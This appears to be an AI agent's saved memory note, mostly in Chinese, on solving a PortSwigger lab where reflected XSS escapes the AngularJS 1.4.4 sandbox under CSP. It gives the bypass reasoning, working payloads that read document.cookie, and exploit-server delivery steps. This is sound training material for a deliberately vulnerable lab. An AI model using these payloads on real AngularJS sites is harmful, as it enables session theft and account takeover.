---
metadata:
  node_type: memory
name: "ps-lab-reflected-xss-angular-sandbox-escape-and-csp"
description: "AngularJS 1.4.4 + CSP lab solved: expensive-checks block $event.view/$event.target, escape is orderBy string predicate (cheap $parse) over $event.composedPath whose last item is window, called via non-member callee (0||alert)(...); 80-char search cap; scored by victim delivery."
last_updated: 2026-10-10T21:37:40+08:00
created: 2026-10-10T21:37:40+08:00
---

- 目标/面: PortSwigger 反射 XSS + AngularJS 1.4.4 + CSP(script-src 'self',无 unsafe-eval);search 词原样反射进 <h1>,body 为 ng-app ng-csp。
- 上限: search 词解码后 <=80 字符(URL 编码长度不计);超限返回 400 JSON "Search term cannot exceed 80 characters"。
- 转义: < > " ' 全不转义 -> 直接 HTML 注入;注入的 ng-* 元素在 bootstrap 时被 Angular 编译。
- 判分面: 本 lab 由 PS victim 浏览器判分(exploit server 有 Deliver exploit to victim);自己浏览器里 alert(document.cookie) 后 banner 仍 is-notsolved(实测),故裁判在交付面。
- 事件指令(ng-focus 等)编译期用 $parse(attr,null,true) = expensiveChecks:
  - 每个成员读结果都过 ensureSafeObject;window(window.window===window -> isecwindow)与 DOM 节点(children+nodeName -> isecdom)只要成为值即抛。
  - 成员调用的 callee context 也查 -> $event.view.alert(...)、(z=$event.view.alert)(1)、[1]|orderBy:$event.view.alert 全被拦;constructor.constructor 被 isecfn 拦。
  - 结论: expensive 面里 window / DOM 节点不能作为值出现,直接逃逸全灭。
- 破法: 过滤器字符串谓词由过滤器内部用默认(cheap)$parse 解析,再按「数组元素作 scope」调用;expensive 面里唯一能无值检查拿到的数组是 $event.composedPath(),其末项就是 window。
  - 谓词在 window 作 scope 时 alert = window.alert、document = window.document;
  - 调 callee 必须用非成员形状 (0||alert)(...) —— 编译器只对 Identifier/MemberExpression callee 生成 context 检查,逻辑 callee 走 l(args) 路径,cheap 面下 Ba(window) 的 context 检查因此被跳过。
- 生效 payload(80 字符,id=x 配 URL #x 片段自动聚焦,无需用户交互):
  <input id=x ng-focus="[$event]|orderBy:'(0||view.alert)(view.document.cookie)'">  +  URL #x
- 备选(72 字符,autofocus,吃不到 cookie 参数): <input autofocus ng-focus="$event.composedPath()|orderBy:'(0||alert)()'">  -> alert:undefined 也算触发。
- 交付: exploit server POST --form urlIsHttps=on responseFile=/exploit responseHead(两行,值内用真实换行)responseBody=<meta http-equiv=refresh content="0;url=<完整 payload URL 含 #x>"> formAction=STORE;再同字段 formAction=DELIVER_TO_VICTIM --follow(hops 302 -> /deliver-to-victim -> /,该 200 响应体已带 is-solved 与 "Congratulations, you solved the lab!")。
- 复用要点: 先看 exploit server 有无 Deliver to victim 定判分面;fragment(#id)聚焦比 autofocus 省字且是真实浏览器触发;80 字符上限逼表达式按字符最小化(谓词 (0||X)(Y) 可压到 26 字符)。
